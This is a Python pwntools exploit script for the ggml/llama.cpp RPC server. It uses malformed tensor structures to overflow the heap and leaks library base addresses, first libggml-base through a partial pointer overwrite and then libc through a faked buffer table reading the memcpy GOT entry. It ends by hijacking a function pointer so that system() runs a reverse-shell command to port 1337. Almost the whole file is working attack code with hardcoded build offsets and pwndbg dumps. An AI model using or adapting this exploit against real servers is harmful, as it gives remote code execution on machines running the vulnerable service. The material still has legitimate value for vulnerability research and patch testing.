from pwn import *
import warnings
import os

warnings.filterwarnings("ignore", category=BytesWarning)
context(arch='amd64',log_level = 'debug')

ALLOC_BUFFER = 0
GET_ALIGNMENT = 1
GET_MAX_SIZE = 2
BUFFER_GET_BASE = 3
FREE_BUFFER = 4
BUFFER_CLEAR = 5
SET_TENSOR = 6
GET_TENSOR = 7
COPY_TENSOR = 8
GRAPH_COMPUTE = 9
GET_DEVICE_MEMORY = 10
COUNT = 11 

class RpcConnection:
    def __init__(self):
        self.io = remote("127.0.0.1", 50052)

    def rpcpack(
        self,
        cmd,
        payload
    ):
        return p8(cmd) + p64(len(payload)) + payload
    
    def alloc_buffer(self,size):
        self.io.send(
            self.rpcpack(
                ALLOC_BUFFER,
                p64(size)
                )
            )

        received = self.io.recvn(0x18)
        ptr = u64(received[0x8:0x10])
        size = u64(received[0x10:0x18])
        log.info(f"[ALO] Allocate buffer @ {hex(ptr)} ({hex(size)})")
        return ptr,size

    def get_base(self,ptr):
        self.io.send(
            self.rpcpack(
                BUFFER_GET_BASE,
                p64(ptr)
            )
        ) 
        received = self.io.recvn(0x10)
        base_ptr = u64(received[0x8:0x10])
        log.info(f"[BAS] Base for {hex(ptr)} -> {hex(base_ptr)}")
        return base_ptr

    
    def cpy_tensor(
        self,
        src_tensor,
        dst_tensor
    ):
        payload = flat([src_tensor,dst_tensor])
        self.io.send(
            self.rpcpack(
                COPY_TENSOR,
                payload
            )
        )
        received = self.io.recvn(0x10)
        result = u64(received[0x8:0x10])
        log.info(f"[CPY] COPY-TENSOR: {result}")
        return result

    def set_tensor(
        self,
        tensor,
        first_p64,
        offset,
        data
    ):
        # const rpc_tensor * in_tensor = (const rpc_tensor *)input.data();
        # uint64_t offset;
        # memcpy(&offset, input.data() + sizeof(rpc_tensor), sizeof(offset));
        # const size_t size = input.size() - sizeof(rpc_tensor) - sizeof(offset);
        
        payload = flat([
            flat(tensor),
            p64(offset),
            p64(first_p64),
            data
        ])
        self.io.send(
            self.rpcpack(
                SET_TENSOR,
                payload
            )
        )
        # received = self.io.recvn(0x10)
        # result = u64(received[0x8:0x10])
        # log.info(f"SET-TENSOR: {result}")
        # return result
    
    def get_tensor(
        self,
        tensor,
        size,
        offset
    ):
        payload = flat([
            flat(tensor),
            p64(offset),
            p64(size),
        ])
        self.io.send(
            self.rpcpack(GET_TENSOR,payload)
        )

    def free_buffer(
        self,
        ptr
    ):
        payload = p64(ptr)
        self.io.send(
            self.rpcpack(FREE_BUFFER,payload)
        )
        received = self.io.recvn(0x8)
        result = u64(received[:0x8])
        log.info(f"[FRE] FREE-BUFFER: {result}")
        return result

def construct_tensor(
    tensor_buffer: int,
    dm1: int,
    dm2: int,
    dm3: int,
    dm4: int,
    data: int
):
    return {
        0: [
           # p32(0),
            0x1,                    # uint64_t id
            p32(2),                 # uint32_t type
            p64(tensor_buffer),            # uint64_t buffer
            [                       # uint32_t ne[GGML_MAX_DIMS];
                                    # GGML_ASSERT(offset + size <= ggml_nbytes(tensor) && "tensor write out of bounds") failed
                p32(32*dm1),         
                p32(32*dm2),
                p32(32*dm3),
                p32(32*dm4),
            ],
            [                       # uint32_t nb[GGML_MAX_DIMS];
                p32(10),             # :: :: xx xx xx xx: 7
                p32(1),             # 1
                p32(1),
                p32(1),
            ],
            p32(0),                 # uint32_t op
            [p32(0)] * 16,          # int32_t op_params (corrected from 8 to 16)
            p32(0),                 # int32_t flags
            [p64(0)] * 10,          # uint64_t src
            p64(0),                 # uint64_t view_src
            p64(0),                 # uint64_t view_offs
            p64(data),              # uint64_t data
            'a' * 64,               # name
            'x' * 4                 # padding
        ],
    }

def main():
    rpc = RpcConnection()
    
    os.system("clear")


    print()
    log.success("Stage One: Prerequisites")
    log.info("[ALLOCATION] Allocating written buffer")
    written_buffer = rpc.alloc_buffer(0x10000)[0]
    written_buffer_base = rpc.get_base(written_buffer)
    print()

    log.info("[ALLOCATION] Allocating manipulated buffer")
    manipulated_buffer = rpc.alloc_buffer(0x100)[0]
    manipulated_buffer_base = rpc.get_base(manipulated_buffer)
    print()

    log.info("[ALLOCATION] Allocating overflow buffer")
    overflow = rpc.alloc_buffer(0x1000)[0]
    overflow_base = rpc.get_base(overflow)
    print()
    
    log.info("[ALLOCATION] Allocating buffer list")
    buffer_list = rpc.alloc_buffer(0x10000)[0]
    buffer_list_base = rpc.get_base(buffer_list)
    print()


    log.info("[ALLOCATION] Allocating written buffer [2]")
    written_buffer_2 = rpc.alloc_buffer(0x10000)[0]
    written_buffer_base_2 = rpc.get_base(written_buffer_2)
    print()

    log.info("[ALLOCATION] Allocating manipulated buffer [2]")
    manipulated_buffer_2 = rpc.alloc_buffer(0x100)[0]
    manipulated_buffer_base_2 = rpc.get_base(manipulated_buffer_2)
    print()

    log.info("[ALLOCATION] Allocating overflow buffer [2]")
    overflow_2 = rpc.alloc_buffer(0x1000)[0]
    overflow_base_2 = rpc.get_base(overflow_2)
    print()
    
    log.info("[ALLOCATION] Allocating 3 padding buffers")
    rpc.alloc_buffer(0x10000)
    rpc.alloc_buffer(0x100)
    rpc.alloc_buffer(0x1000)
    print()
    # Weird arrangment, but it works or buffer3 will be adjacent to 2 freed buffers,
    # and we might crash

    log.info("[ALLOCATION] Allocating written buffer [3]")
    written_buffer_3 = rpc.alloc_buffer(0x10000)[0]
    written_buffer_base_3 = rpc.get_base(written_buffer_3)
    print()

    log.info("[ALLOCATION] Allocating manipulated buffer [3]")
    manipulated_buffer_3 = rpc.alloc_buffer(0x100)[0]
    manipulated_buffer_base_3 = rpc.get_base(manipulated_buffer_3)
    print()

    # log.info("Allocating overflow buffer [3]")
    # overflow_3 = rpc.alloc_buffer(0x1000)[0]
    # overflow_base_3 = rpc.get_base(overflow_3)
    # print()
    

    # Fill up tcache:
    # tcache = []
    # for i in range(7-4):
    #     tcache.append(rpc.alloc_buffer(0x100+i)[0])
        
    # for i in range(len(tcache)):
    #     rpc.free_buffer(tcache[i])


    # for i in range(7):
    #     rpc.free_buffer(rpc.alloc_buffer(0x10)[0])
     
    """
    we use 32*n for every dimension since
    ggml aligns the buffer to 32 bytes
    """

    set_tensor_target = construct_tensor(
        tensor_buffer=written_buffer,
        dm1=10,
        dm2=10,
        dm3=10,
        dm4=10,
        data=written_buffer_base
    )


    
    # pwndbg> hexdump 0x55555557dd10-0x10 200
    # +0000 0x55555557dd00  00 00 00 00 00 00 00 00  71 00 00 00 00 00 00 00  │........│q.......│
    # +0010 0x55555557dd10  6f 94 e8 f7 ff 7f 00 00  36 90 e8 f7 ff 7f 00 00  │o.......│6.......│
    # +0020 0x55555557dd20  00 00 00 00 00 00 00 00  00 91 e8 f7 ff 7f 00 00  │........│........│
    # +0030 0x55555557dd30  e2 91 e8 f7 ff 7f 00 00  07 92 e8 f7 ff 7f 00 00  │........│........│
    # +0040 0x55555557dd40  82 98 e8 f7 ff 7f 00 00  25 91 e8 f7 ff 7f 00 00  │........│%.......│
    # +0050 0x55555557dd50  00 00 00 00 00 00 00 00  20 0b ec f7 ff 7f 00 00  │........│........│
    # +0060 0x55555557dd60  00 dc 57 55 55 55 00 00  00 01 00 00 00 00 00 00  │..WUUU..│........│
    # +0070 0x55555557dd70  00 00 00 00 00 00 00 00  11 01 00 00 00 00 00 00  │........│........│
    # +0080 0x55555557dd80  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  │........│........│
    # ... ↓            skipped 2 identical lines (32 bytes)
    # +00b0 0x55555557ddb0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  │........│........│
    # +00c0 0x55555557ddc0  00 00 00 00 00 00 00 00                           │........│        │
    # pwndbg> 

    # +0000 0x55555557dd00  6f 61 61 63 70 61 61 63  71 61 61 63 72 61 61 63  │oaacpaac│qaacraac│
    # +0010 0x55555557dd10  73 61 61 63 74 61 61 63  75 61 61 63 76 61 61 63  │saactaac│uaacvaac│
    # +0020 0x55555557dd20  77 61 61 63 78 61 61 63  79 61 61 63 7a 61 61 64  │waacxaac│yaaczaad│
    # +0030 0x55555557dd30  62 61 61 64 63 61 61 64  64 61 61 64 65 61 61 64  │baadcaad│daadeaad│
    # +0040 0x55555557dd40  66 61 61 64 67 61 61 64  68 61 61 64 69 61 61 64  │faadgaad│haadiaad│
    # +0050 0x55555557dd50  6a 61 61 64 6b 61 61 64  6c 61 61 64 6d 61 61 64  │jaadkaad│laadmaad│
    # +0060 0x55555557dd60  6e 61 61 64 6f 61 61 64  70 61 61 64 71 61 61 64  │naadoaad│paadqaad│
    # +0070 0x55555557dd70  72 61 61 64 73 61 61 64  74 61 61 64 75 61 61 64  │raadsaad│taaduaad│
    # +0080 0x55555557dd80  76 61 61 64 77 62 61 64  78 61 61 64 79 61 61 64  │vaadwaad│xaadyaad│
    # +0090 0x55555557dd90  7a 61 61 65 62 61 61 65  63 61 61 65 64 61 61 65  │zaaebaae│caaedaae│
    # +00a0 0x55555557dda0  65 61 61 65 66 61 61 65  67 61 61 65 68 61 61 65  │eaaefaae│gaaehaae│
    # +00b0 0x55555557ddb0  69 61 61 65 6a 61 61 65  6b 61 61 65 6c 61 61 65  │iaaejaae│kaaelaae│
    # +00c0 0x55555557ddc0  6d 61 61 65 6e 61 61 65                           │maaenaae│        │
    
    # 0x636161706361616f: 0xdeadbeefdeadbeef <- 256 (0x100)

    def fake_ggml_backend_buffer_table(
        free_buffer,
        get_base,
        init_tensor,
        memset_tensor,
        set_tensor,
        get_tensor,
        cpy_tensor,
        clear,
        reset,
        buft,
        context,
        size,
        usage
    ):
        return [
                p64(0), p64(0x71),          # chunk header
                [                           # iface
                    p64(free_buffer),
                    p64(get_base),
                    p64(init_tensor),
                    p64(memset_tensor),
                    p64(set_tensor),
                    p64(get_tensor),
                    p64(cpy_tensor),
                    p64(clear),
                ],
                p64(reset),
                p64(buft),
                p64(context),
                p64(size),
                p64(usage)
            ]

    # b'oaacpaac': [

    # Find symbols in the specified range
    # for name, addr in libggml.symbols.items():
    #     if 0x17000 < addr < 0x26fff:
    #         log.info(f"Symbol {name}: {hex(addr)}")
    
    # pwndbg> p/x 0x7ffff7e80000-0x7ffff7e69000
    # $3 = 0x17000
    # pwndbg> p/x 0x7ffff7e8ffff-0x7ffff7e69000
    # $4 = 0x26fff
    


    
    print()
    log.success("Stage Two: Leaking libggml-base BASE")
    
    log.info("[HEAP-ARRANGEMENT] Setting buffer-list (legacy)")
    rpc.set_tensor(
        tensor=construct_tensor(
            buffer_list,
            10,
            10,
            10,
            10,
            buffer_list_base
        ),
        first_p64=0x0, #addr-1
        offset=0x0,
        data=flat({
            0:[
                #p64(0xdeadbeef)*10
            ]
        })
    )
    
    payload = flat({
        0: p64(1),                  #buffers
        248:[
            p64(0xdeadbeefdeadbeef),p64(0x21),
            # PATCHED: partial write for dc22344 build
            # ggml_backend_buffer_get_type is at 0x24ff0
            p64(0), b'\xf0\x4f'     # &ggml_backend_buffer_get_type -> 0x24ff0
                                    # Partial writing
        ]
    })

    log.info("[TENSOR] Partial overwriting buffer->get_base()")
    rpc.set_tensor(
        set_tensor_target,
        buffer_list_base, #<- for some reason the buffer
        0x0,
        #cyclic(0x200)
        payload
        #b'a'
    ) # starting at data+0x10
    
    # offsetless end
    

    # payload = flat({
    #     248-0x10:[
    #         p64(0xdeadbeefdeadbeef),p64(0x21),
    #         p64(0x7ffff7e896ec), b'\x06\x92\x00'
    #     ]
    # })

    # rpc.set_tensor(
    #     set_tensor_target,
    #     0x10,
    #     0x10,
    #     #cyclic(0x200)
    #     payload
    #     #b'a'
    # ) # starting at data+0x10


    # demension size -1, size -0x2
    # 3,3,3,3
    # src = construct_tensor(
    #     tensor_buffer=written_buffer,
    #     dm1=3,
    #     dm2=3,
    #     dm3=3,
    #     dm4=2,
    #     data=written_buffer_base
    # )

    # src = construct_tensor(
    #     tensor_buffer=written_buffer,
    #     dm1=3,
    #     dm2=3,
    #     dm3=3,
    #     dm4=2,
    #     data=written_buffer_base
    # )

    #     size_t ggml_nbytes(const struct ggml_tensor * tensor) {
    #     size_t nbytes;
    #     const size_t blck_size = ggml_blck_size(tensor->type);
    #     if (blck_size == 1) {
    #         nbytes = ggml_type_size(tensor->type);
    #         for (int i = 0; i < GGML_MAX_DIMS; ++i) {
    #             nbytes += (tensor->ne[i] - 1)*tensor->nb[i];
    #         }
    #     }
    #     else {
    #         nbytes = tensor->ne[0]*tensor->nb[0]/blck_size;
    #         for (int i = 1; i < GGML_MAX_DIMS; ++i) {
    #             nbytes += (tensor->ne[i] - 1)*tensor->nb[i];
    #         }
    #     }

    # return nbytes;
    # }

    
    src ={
        0: [
           # p32(0),
            0x1,                    # uint64_t id
            p32(2),                 # uint32_t type
            p64(written_buffer),            # uint64_t buffer
            [                       # uint32_t ne[GGML_MAX_DIMS];
                                    # GGML_ASSERT(offset + size <= ggml_nbytes(tensor) && "tensor write out of bounds") failed
                p32(32*3),         
                p32(32*3),
                p32(32*3),
                p32(63),
            ],
            [                       # uint32_t nb[GGML_MAX_DIMS];
                p32(10),             # :: :: xx xx xx xx: 7
                p32(1),             # 1
                p32(1),
                p32(1),
            ],
            p32(0),                 # uint32_t op
            [p32(0)] * 16,          # int32_t op_params (corrected from 8 to 16)
            p32(0),                 # int32_t flags
            [p64(0)] * 10,          # uint64_t src
            p64(0),                 # uint64_t view_src
            p64(0),                 # uint64_t view_offs
            p64(written_buffer_base),              # uint64_t data
            'a' * 64,               # name
            'x' * 4                 # padding
        ],
    }
    

    dst = construct_tensor(
        tensor_buffer=manipulated_buffer,
        dm1=4,
        dm2=1,
        dm3=1,
        dm4=1,
        data=manipulated_buffer_base
    )

    rpc.cpy_tensor(src,dst)
    
    log.info("[TENSOR] Sending BUFFER_GET_BASE")
    rpc.io.send(
        rpc.rpcpack(
            BUFFER_GET_BASE,
            p64(manipulated_buffer)
        )
    ) 
    
    received = rpc.io.recvn(0x18)
    leaked = (u64(received[0x10:0x18]) >> 12 ) << 4
    if leaked:
        log.success(f"Leaked!")
    else:
        log.failure("Failed to leak!")

    log.success(f"ggml_backend_cpu_buffer_type -> {hex(leaked)}")
    # PATCHED FOR dc22344 Release build
    ggml_base = leaked - 0x29f80
    ggml_begin = ggml_base - 0xf980 # .text section starts at 0xf980 for this build
    log.success(f"libggml-base.so -> {hex(ggml_base)}")

    # PATCHED OFFSETS FOR dc22344 Release build
    free_buffer_offset      = 0x24c50
    get_base_offset         = 0x248b0
    init_tensor_offset      = 0x0
    memset_tensor_offset    = 0x24910
    set_tensor_offset       = 0x24950
    get_tensor_offset       = 0x24970
    cpy_tensor_offset       = 0x250a0
    clear_offset            = 0x24930
    reset_offset            = 0x0
    
    log.info(f"\tbuffer->free_buffer = {hex(free_buffer_offset+ggml_base)}")
    log.info(f"\tbuffer->get_base = {hex(get_base_offset+ggml_base)}")
    log.info(f"\tbuffer->init_tensor = {hex(init_tensor_offset+ggml_base)}")
    log.info(f"\tbuffer->memset_tensor = {hex(memset_tensor_offset+ggml_base)}")
    log.info(f"\tbuffer->set_tensor = {hex(set_tensor_offset+ggml_base)}")
    log.info(f"\tbuffer->get_tensor = {hex(get_tensor_offset+ggml_base)}")
    log.info(f"\tbuffer->cpy_tensor = {hex(cpy_tensor_offset+ggml_base)}")
    print()

    
    #248-0x10: [
    #         buf1,
    #         p64(0x111) # prevent heap corruption
    #     ]
    print()
    log.success("Stage Three: Bypass boundary check via libggml")
    ggml = ELF('./libggml-base.so', checksec=False)
    log.success(f"memcpy[got]-0x30 => {hex(ggml_begin + ggml.got['memcpy'] - 0x30)}")
    payload = flat({               
        248:[
            fake_ggml_backend_buffer_table(
                free_buffer = 0,
                get_base = ggml_base + get_base_offset,
                init_tensor = ggml_base + init_tensor_offset,
                memset_tensor = ggml_base + memset_tensor_offset,
                set_tensor = ggml_base + set_tensor_offset,
                get_tensor = ggml_base + get_tensor_offset,
                cpy_tensor = ggml_base + cpy_tensor_offset,
                clear = ggml_base + clear_offset,
                reset = ggml_base + reset_offset,
                buft = 0x0,
                context = ggml_begin + ggml.got['memcpy'] - 0x30,
                size = 0x110,
                usage = 0x0,
            ),
            p64(0x111)
        ]
    })

    set_tensor_target = construct_tensor(
        tensor_buffer=written_buffer_2,
        dm1=10,
        dm2=10,
        dm3=10,
        dm4=10,
        data=written_buffer_base_2
    )

    log.info(f"[TENSOR] Faking buffer->context: memcpy[got]")
    rpc.set_tensor(
        set_tensor_target,
        0x0, 
        0x0,
        payload
    )
   
    src = construct_tensor(
        tensor_buffer=written_buffer_2,
        dm1=4,
        dm2=4,
        dm3=4,
        dm4=4,
        data=written_buffer_base_2
    )

    dst = construct_tensor(
        tensor_buffer=manipulated_buffer_2,
        dm1=1,
        dm2=1,
        dm3=1,
        dm4=1,
        data=manipulated_buffer_base_2
    )

    log.info("[TENSOR] Overflowing fake buffer->context")
    rpc.cpy_tensor(src,dst) 

    log.info("[TENSOR] Calling get_tensor() on faked buffer->base")
    rpc.get_tensor(
        tensor=construct_tensor(
            manipulated_buffer_2,
            1,1,1,1,
            ggml_begin+ggml.got['memcpy']
        ),
        offset=0x0,
        size=0x8
    )
    rpc.io.recvn(8)
    received = rpc.io.recvn(0x8)
    leaked_memcpy = u64(received) >> 16
    if leaked_memcpy:
        log.success(f"Leaked!")
    else:
        log.failure("Failed to leak!")
   
    log.success(f"\tmemcpy_got -> {hex(leaked_memcpy)}")
    # PATCHED FOR glibc 2.39
    libc_base = leaked_memcpy - 0xb1740
    system = libc_base + 0x58750
    log.success(f"\tlibc.so.6 -> {hex(libc_base)}")
    log.success(f"\tsystem -> {hex(system)}")
    print()


    print()
    # listener = listen(1337)
    log.success("Stage Four: ggml_backend_get_aligment / backend")
    
    # PATCHED FOR dc22344 build
    ggml_backend_get_alignment = 0x25c00
    log.info(f"\tggml_backend_get_alignment -> {hex(ggml_backend_get_alignment+ggml_base)}")

    cmd = b"""sh -i >& /dev/tcp/127.0.0.1/1337 0>&1\x00"""

    print()
    log.info("[TENSOR] Faking backend/backend->device structure")
    log.info(f"\tbackend->device: {cmd}")
    log.info(f"\tbackend->device->iface.get_buffer_type: {hex(system)}")
    log.info(f"\tbuffer->iface.get_base: {hex(ggml_base + ggml_backend_get_alignment)}")
    print()
    
    payload = flat({               
        0:[
            p64(0xdaedbeef),
            cmd,
        ],
        0x616161706161616f: [p64(system)],
        248:[
            fake_ggml_backend_buffer_table(
                free_buffer     = 0,
                get_base        = ggml_base + ggml_backend_get_alignment,
                init_tensor     = 0xdeadbeef,
                memset_tensor   = 0xdeadbeef,
                set_tensor      = 0xdeadbeef,
                get_tensor      = 0xdeadbeef,
                cpy_tensor      = 0xdeadbeef,
                clear           = 0xdeadbeef,
                reset           = 0xdeadbeef,
                buft            = 0xdeadbeef,
                context         = 0xdeadbeef,
                size            = 0x110,
                usage           = 0,
            ),
            p64(0x111),
            p64(manipulated_buffer_base_3+0x10),
        ]
    })

    set_tensor_target = construct_tensor(
        tensor_buffer=written_buffer_3,
        dm1=10,
        dm2=10,
        dm3=10,
        dm4=10,
        data=written_buffer_base_3  
    )

    
    rpc.set_tensor(
        set_tensor_target,
        0x0, 
        0x0,
        payload
    )
   
    src = construct_tensor(
        tensor_buffer=written_buffer_3,
        dm1=4,
        dm2=4,
        dm3=4,
        dm4=4,
        data=written_buffer_base_3
    )

    dst = construct_tensor(
        tensor_buffer=manipulated_buffer_3,
        dm1=1,
        dm2=1,
        dm3=1,
        dm4=1,
        data=manipulated_buffer_base_3
    )
    

    log.info("[TENSOR] Overflowing fake buffer->context")
    rpc.cpy_tensor(src,dst) 

    log.info("[TENSOR] Calling BUFFER_GET_BASE -> ggml_backend_cpu_buffer_get_base")
    rpc.io.send(
        rpc.rpcpack(
            BUFFER_GET_BASE,
            p64(manipulated_buffer_3)
        )
    ) 
    log.success("Shell should be up!")
    
    # listener.wait_for_connection()
    
    # log.info("Received shell!")
    # listener.interactive()



    
if __name__ == "__main__":
    main()
